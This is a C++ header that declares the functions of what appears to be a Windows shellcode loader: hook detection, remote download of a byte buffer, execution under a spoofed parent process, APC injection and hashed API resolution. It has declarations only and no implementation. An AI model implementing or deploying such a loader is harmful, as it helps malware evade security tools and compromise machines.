#pragma once
#include <vector>
#include <Windows.h>

// Functions definitions
BOOL isItHooked(LPVOID addr);
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
DWORD GetPID();

void raw_exec_ppid(std::vector<BYTE> sh, DWORD exPID);
void IndirectAPC();

FARPROC CustomGetProcAddress(IN HMODULE hModule, IN DWORD lpApiName);
HMODULE CustomGetModuleHandle(IN LPCWSTR szModuleName);
